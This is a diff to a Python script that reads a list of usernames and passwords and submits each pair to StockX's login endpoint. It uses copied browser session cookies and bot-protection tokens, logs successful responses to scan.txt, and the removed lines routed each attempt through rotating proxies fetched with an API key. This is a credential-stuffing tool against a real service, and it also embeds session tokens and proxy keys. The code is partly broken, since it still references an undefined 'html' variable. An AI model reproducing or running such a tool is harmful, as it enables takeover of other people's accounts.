@@ -267,62 +267,99 @@ def open_txt():
 # 读文件切割重发
 def open_txt2():
     with open(sys.path[0] + '/z.txt', 'r', encoding='utf-8') as f:
+        scan = open('./scan.txt', 'a+')
         read_data = f.readlines()
         for i in range(len(read_data)):
             line = read_data[i].strip()
             txt2 = line.split("\t")
             # ip = get_ip()
-            ip = requests.get(
-                'http://17680492987.user.xiecaiyun.com/api/proxies?action=getText&key=NP4A43A3ED&count=1&word=&rand=true&norepeat=false&detail=false&ltime=0')
-            ip = ip.text.strip()
-            print(ip)
-            url = 'https://accounts.stockx.com/usernamepassword/login'
-            headers = {'Host': 'accounts.stockx.com', 'Connection': 'keep-alive', 'Content-Length': '530',
-                       'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
-                       'Content-Type': 'application/json',
-                       'Auth0-Client': 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9',
-                       'sec-ch-ua-mobile': '?0',
-                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
-                       'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://accounts.stockx.com',
-                       'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
-                       'Referer': 'https://accounts.stockx.com/login?state=hKFo2SBsLVlTbVR2TDMxcTBZZ3RDcDI2UWVTc1B3cklnenQwc6FupWxvZ2luo3RpZNkgd0hfMDZiQWlIRVJNd1V4UGR3T2lUdjd6Sld2U2RFV0mjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4xIn0%3D&connection=production&lng=en&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2F&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=en-us&stockx-session-id=ebc6c543-b9c4-4b83-aed3-b646eb34f787&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36%20Edg%2F106.0.1370.42&ui_locales=en',
-                       'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9'}
-            cookies = {'_csrf': 'dCcje3tzTbfOfyS6nz6LGouE',
-                       '__cf_bm': '.2UKnQR9NgFVSZMmoY18pgnZWJnlkC5gnCKbFG1QiBA-1665816436-0-AXZkD+jOUDchiejAOVWvHJouyM3JjMpJ7VqLjOFmGFR5QuQhxgxNuE3nrLhOn1DvfX5Puuxy3RAynBXqvrzfClI',
-                       'pxcts': '37a26909-4c55-11ed-a2d4-766e50474455',
-                       '_pxvid': '37a25c7c-4c55-11ed-a2d4-766e50474455',
-                       'forterToken': '04264e16539e4132a52701bcc4f32323_1665816438938__UDF43_13ck',
-                       '__pxvid': '37c9496c-4c55-11ed-8233-0242ac120002',
-                       'ajs_anonymous_id': 'f80a2073-8b49-4734-b427-134e1ce884f0',
-                       '_gcl_au': '1.1.1859648209.1665816440', '_clck': 'uiq1zh|1|f5q|0',
-                       'rbuid': 'rbos-345454e7-5b8f-45ef-a670-311db306c0c3',
-                       '_px3': '1860464ddb59bc2be3221f0aec398a7a9a1fee589fa8048fd63f8891bf6700c8:ww3m4axNTP6R569SG9adUAFYt0cZ3YLnLqLyN8d/T+gyk57bGNGwyz9/PSDQwICqX/uDpMxQM0vyg6PJGLFfpg',
-                       'did': 's%3Av0%3A4c094340-4c55-11ed-9d04-790e9c2b5e68.art%2B5kxLf5axO6iCXtaBATVSGTjlmjH%2BttPNzI0ZPdY',
-                       'auth0': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQF_Wd4a0aQEqQhsgd33RwbX9Hg779jlQqFxR23EzJKmRjEODzTesh0z540N8JvLwftRA66CnhTa0lotvn33dbtemY29va2llg6dleHBpcmVz1_8NHO8AY05MG65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.zd9SKBMlN5eZBLvBaKfXFYEogGKmc4pz79WsvpHuKFg',
-                       'did_compat': 's%3Av0%3A4c094340-4c55-11ed-9d04-790e9c2b5e68.art%2B5kxLf5axO6iCXtaBATVSGTjlmjH%2BttPNzI0ZPdY',
-                       'auth0_compat': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQF_Wd4a0aQEqQhsgd33RwbX9Hg779jlQqFxR23EzJKmRjEODzTesh0z540N8JvLwftRA66CnhTa0lotvn33dbtemY29va2llg6dleHBpcmVz1_8NHO8AY05MG65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.zd9SKBMlN5eZBLvBaKfXFYEogGKmc4pz79WsvpHuKFg',
-                       '_clsk': '1d684tz|1665816480444|2|0|l.clarity.ms/collect', 'language_code': 'en',
-                       '_uetsid': '372d7f304c5511edadc3775920b54518', '_uetvid': '372dbc104c5511ed9f86ef2042a4d88c',
-                       '_pxde': 'eaa382f6d2bd416caf95a0cbe51755fbbd99e4b6b0cb0c20fa87248c4a286f9c:eyJ0aW1lc3RhbXAiOjE2NjU4MTY1MjYxNDMsImZfa2IiOjB9',
-                       'QuantumMetricSessionID': '1de20627dfab78e60796c899dfd6f8b7',
-                       'QuantumMetricUserID': '940372d5ff5606c5017355a57683a23c', '_dd_s': 'logs'}
-            data = '{"client_id":"OVxrt4VJqTx7LIUKd661W0DuVMpcFByD","redirect_uri":"https://stockx.com/callback?path=/","tenant":"stockx-prod","response_type":"code","scope":"openid profile","audience":"gateway.stockx.com","_csrf":"Hr64JECi-eh3qbkrmluW8r-UOS9mstJPLYik","state":"hKFo2SBsLVlTbVR2TDMxcTBZZ3RDcDI2UWVTc1B3cklnenQwc6FupWxvZ2luo3RpZNkgd0hfMDZiQWlIRVJNd1V4UGR3T2lUdjd6Sld2U2RFV0mjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA","_intstate":"deprecated","username":"' + \
-                   txt2[1] + '","password":"' + txt2[2] + '","connection":"production"}'
+            # ip = requests.get(
+            #     'http://api.ipipgo.com/ip?cty=00&c=1&pt=1&ft=txt&pat=\n&rep=1&key=b18b2bd7&ts=3')
+            # ip = ip.text.strip()
+            # print(ip)
 
-            # html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data)
-            # urls = "http://17680492987:17680492987@"+ip
-            html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data,
-                                 proxies={'HTTPS': 'HTTPS://' + ip})
+            cookies = {
+                '_csrf': 'A1SxMHjGMENme8pmZmb9dKsM',
+                '_pxvid': '24d89445-49f3-11ed-b089-50706f744c58',
+                '__pxvid': '2558ea16-49f3-11ed-8c5a-0242ac120002',
+                '__ssid': '35d25268ae9eac82a15aec2277bc6ca',
+                'rskxRunCookie': '0',
+                'rCookie': 'cu397e3yes5ka8w5hd6bll9583h0i',
+                'ajs_anonymous_id': '7350e34e-713d-4747-b302-e4c974db3d99',
+                '_gcl_au': '1.1.2006874050.1665554419',
+                'QuantumMetricUserID': '378116bf6ce7480a1a4a9ddc59a353f7',
+                '_clck': '6wqy4|1|f5q|0',
+                '_pin_unauth': 'dWlkPU5qVmxZakUxWVdRdFpqQmhOUzAwTjJJM0xXRmpPR0V0TXpka1pUQmxaVFpoTWpoaw',
+                '_ga': 'GA1.2.1145501697.1665844018',
+                'OptanonConsent': 'isGpcEnabled=0&datestamp=Sun+Oct+16+2022+01%3A02%3A12+GMT%2B0800+(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)&version=6.39.0&isIABGlobal=false&hosts=&consentId=7959fc05-58db-4792-9b62-4e539712c2af&interactionCount=1&landingPath=https%3A%2F%2Fstockx.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0005%3A1%2CC0003%3A1',
+                'lastRskxRun': '1665856616673',
+                'did': 's%3Av0%3A7cbbd990-64b4-11ed-b4a9-2b76e74f3560.E0yde8kdw4it%2FU%2FGN4DSrMRlNS0ddzJfqvUgQpobjEU',
+                'did_compat': 's%3Av0%3A7cbbd990-64b4-11ed-b4a9-2b76e74f3560.E0yde8kdw4it%2FU%2FGN4DSrMRlNS0ddzJfqvUgQpobjEU',
+                'rbuid': 'rbos-0086f337-a5db-47ad-abb7-62ac6d80dd47',
+                'pxcts': 'cf91c0af-6d7d-11ed-954c-4e4664636c65',
+                'forterToken': '1f5d2c3dc6034949bdbe239f1a4ed33f_1669462268956__UDF43_13ck',
+                'auth0': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQEknWSW879E7IAXG8yeohe9VXMeN6EQn3ROJywRbeFbWSadnOm4oQ6JxD1Bw9D2bs7AhVJOvwcD91TMKtuC3KUOmY29va2llg6dleHBpcmVz1_9IPacAY4Xtg65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.QPlW8zB3OBPvbZCU9QdPk%2FmeCDm2EMG%2F7hKlYs0nJGU',
+                'auth0_compat': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQEknWSW879E7IAXG8yeohe9VXMeN6EQn3ROJywRbeFbWSadnOm4oQ6JxD1Bw9D2bs7AhVJOvwcD91TMKtuC3KUOmY29va2llg6dleHBpcmVz1_9IPacAY4Xtg65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.QPlW8zB3OBPvbZCU9QdPk%2FmeCDm2EMG%2F7hKlYs0nJGU',
+                'language_code': 'en',
+                'QuantumMetricSessionID': '0b3f0b475ef5902245b4c8a0ae6d14b3',
+                '_px3': 'dc39bda80365ec9ad1ab617936d2c218870b80c59f59e075eb6863dbef3f154f:6qtv6suj59ejc2zWBqX5q+SZBXsjRpRDF9+CQDK9BmmkXvd907emVeF7T4SszkyIPT0BdZ2yVeplcVIEsQpPwA==:1000:4gHmPUj/RC70QiUvc/1c8EyETQVGave0aCC4Y3WUNebzB+8ygTx4ldcs4sfl8G2WE1xN/8HOCXLC1GCEE/tZ/lVMiUwnrw83eiixxbbOhxYLqbblWqXKP5d10LrKPIm7XjVYsSgbUAvPijZeSvtZCC/VJxoFAY3ge68aJJMRk6B19IYqlLfYN4rJKGkzMPXaIlG8ZOa23hV6RVuiaqaBhIgFZ/IMvKocufFBreZmxV8=',
+                '_pxde': '82682d929c0d7bc827a6043f05aa369c0f929b388fac806d58e1ce932fe05fc2:eyJ0aW1lc3RhbXAiOjE2Njk0NjUwNDE2MTUsImZfa2IiOjB9',
+                '__cf_bm': '4n7J6_lBEyxkgWFqP8VqCjZqebWJEhmpHtwfWoG.EBM-1669465124-0-AcQxfnPqeK4T4z7DAlF8LGtMOwESC3A7MfT9wRL7LyizEvwQMAqXYgCzgXJ2Pv1F/Bnkl9kML6DJvSchBgqxdO4=',
+                '_uetsid': 'd44f13706d7d11eda2bb931be9effd05',
+                '_uetvid': '2683d41049f311eda2beed482f7df48e',
+                '_dd_s': 'logs=1&id=9254a42f-440e-42e4-a6dc-18e2e15fa067&created=1669463545838&expire=1669466180965',
+            }
+
+            headers = {
+                'authority': 'accounts.stockx.com',
+                'accept': '*/*',
+                'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6',
+                'auth0-client': 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9',
+                'cache-control': 'no-cache',
+                # Already added when you pass json=
+                # 'content-type': 'application/json',
+                # Requests sorts cookies= alphabetically
+                # 'cookie': '_csrf=A1SxMHjGMENme8pmZmb9dKsM; _pxvid=24d89445-49f3-11ed-b089-50706f744c58; __pxvid=2558ea16-49f3-11ed-8c5a-0242ac120002; __ssid=35d25268ae9eac82a15aec2277bc6ca; rskxRunCookie=0; rCookie=cu397e3yes5ka8w5hd6bll9583h0i; ajs_anonymous_id=7350e34e-713d-4747-b302-e4c974db3d99; _gcl_au=1.1.2006874050.1665554419; QuantumMetricUserID=378116bf6ce7480a1a4a9ddc59a353f7; _clck=6wqy4|1|f5q|0; _pin_unauth=dWlkPU5qVmxZakUxWVdRdFpqQmhOUzAwTjJJM0xXRmpPR0V0TXpka1pUQmxaVFpoTWpoaw; _ga=GA1.2.1145501697.1665844018; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Oct+16+2022+01%3A02%3A12+GMT%2B0800+(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)&version=6.39.0&isIABGlobal=false&hosts=&consentId=7959fc05-58db-4792-9b62-4e539712c2af&interactionCount=1&landingPath=https%3A%2F%2Fstockx.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1%2CC0005%3A1%2CC0003%3A1; lastRskxRun=1665856616673; did=s%3Av0%3A7cbbd990-64b4-11ed-b4a9-2b76e74f3560.E0yde8kdw4it%2FU%2FGN4DSrMRlNS0ddzJfqvUgQpobjEU; did_compat=s%3Av0%3A7cbbd990-64b4-11ed-b4a9-2b76e74f3560.E0yde8kdw4it%2FU%2FGN4DSrMRlNS0ddzJfqvUgQpobjEU; rbuid=rbos-0086f337-a5db-47ad-abb7-62ac6d80dd47; pxcts=cf91c0af-6d7d-11ed-954c-4e4664636c65; forterToken=1f5d2c3dc6034949bdbe239f1a4ed33f_1669462268956__UDF43_13ck; auth0=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQEknWSW879E7IAXG8yeohe9VXMeN6EQn3ROJywRbeFbWSadnOm4oQ6JxD1Bw9D2bs7AhVJOvwcD91TMKtuC3KUOmY29va2llg6dleHBpcmVz1_9IPacAY4Xtg65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.QPlW8zB3OBPvbZCU9QdPk%2FmeCDm2EMG%2F7hKlYs0nJGU; auth0_compat=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQEknWSW879E7IAXG8yeohe9VXMeN6EQn3ROJywRbeFbWSadnOm4oQ6JxD1Bw9D2bs7AhVJOvwcD91TMKtuC3KUOmY29va2llg6dleHBpcmVz1_9IPacAY4Xtg65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.QPlW8zB3OBPvbZCU9QdPk%2FmeCDm2EMG%2F7hKlYs0nJGU; language_code=en; QuantumMetricSessionID=0b3f0b475ef5902245b4c8a0ae6d14b3; _px3=dc39bda80365ec9ad1ab617936d2c218870b80c59f59e075eb6863dbef3f154f:6qtv6suj59ejc2zWBqX5q+SZBXsjRpRDF9+CQDK9BmmkXvd907emVeF7T4SszkyIPT0BdZ2yVeplcVIEsQpPwA==:1000:4gHmPUj/RC70QiUvc/1c8EyETQVGave0aCC4Y3WUNebzB+8ygTx4ldcs4sfl8G2WE1xN/8HOCXLC1GCEE/tZ/lVMiUwnrw83eiixxbbOhxYLqbblWqXKP5d10LrKPIm7XjVYsSgbUAvPijZeSvtZCC/VJxoFAY3ge68aJJMRk6B19IYqlLfYN4rJKGkzMPXaIlG8ZOa23hV6RVuiaqaBhIgFZ/IMvKocufFBreZmxV8=; _pxde=82682d929c0d7bc827a6043f05aa369c0f929b388fac806d58e1ce932fe05fc2:eyJ0aW1lc3RhbXAiOjE2Njk0NjUwNDE2MTUsImZfa2IiOjB9; __cf_bm=4n7J6_lBEyxkgWFqP8VqCjZqebWJEhmpHtwfWoG.EBM-1669465124-0-AcQxfnPqeK4T4z7DAlF8LGtMOwESC3A7MfT9wRL7LyizEvwQMAqXYgCzgXJ2Pv1F/Bnkl9kML6DJvSchBgqxdO4=; _uetsid=d44f13706d7d11eda2bb931be9effd05; _uetvid=2683d41049f311eda2beed482f7df48e; _dd_s=logs=1&id=9254a42f-440e-42e4-a6dc-18e2e15fa067&created=1669463545838&expire=1669466180965',
+                'origin': 'https://accounts.stockx.com',
+                'pragma': 'no-cache',
+                'referer': 'https://accounts.stockx.com/login?state=hKFo2SBGazZ0ajhNOWYwOEJrSmxJQzdDMkhlUENmY0pDMkJSd6FupWxvZ2luo3RpZNkgYXRqSmRIaXlKUlRvbkxyWkNPTndBdG40ZGlpWi0wcFKjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4yIn0%3D&connection=production&lng=en&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2F%26iss%3Dhttps%253A%252F%252Faccounts.stockx.com%252F&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=en-us&stockx-session-id=6d3eb97e-0585-4bfa-a5f5-ebc576c1e451&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F107.0.0.0%20Safari%2F537.36%20Edg%2F107.0.1418.56&ui_locales=en',
+                'sec-ch-ua': '"Microsoft Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
+            }
+
+            json_data = {
+                'client_id': 'OVxrt4VJqTx7LIUKd661W0DuVMpcFByD',
+                'redirect_uri': 'https://stockx.com/callback?path=/&iss=https%3A%2F%2Faccounts.stockx.com%2F',
+                'tenant': 'stockx-prod',
+                'response_type': 'code',
+                'scope': 'openid profile',
+                'audience': 'gateway.stockx.com',
+                '_csrf': 'qSPOfTRR-0P0UYS3eupZyrmUuVg8NkeMQIbs',
+                'state': 'hKFo2SBGazZ0ajhNOWYwOEJrSmxJQzdDMkhlUENmY0pDMkJSd6FupWxvZ2luo3RpZNkgYXRqSmRIaXlKUlRvbkxyWkNPTndBdG40ZGlpWi0wcFKjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA',
+                '_intstate': 'deprecated',
+                'username': txt2[1],
+                'password': txt2[2],
+                'connection': 'production',
+            }
+
+            response = requests.post('https://accounts.stockx.com/usernamepassword/login', cookies=cookies, headers=headers, json=json_data)
             try:
-                thes = json.loads(html.text)
+                thes = json.loads(response.text)
                 print(line)
+                print(response.text)
                 if thes['statusCode'] != 400 and thes['statusCode'] != 429:  # 429
                     print(html.text)
                     # print(html.text.decode(''))
-                    f.writelines(line, html.text)
-                    f.flush()
+                    scan.writelines(line, html.text)
+                    scan.flush()
             except:
                 continue
+        scan.close()
 
 
 # 用于快速设置 profile 的代理信息的方法
@@ -419,6 +456,6 @@ def open_web():
                 continue
 
 
-open_web()
-# open_txt2()
+# open_web()
+open_txt2()
 # repeats()
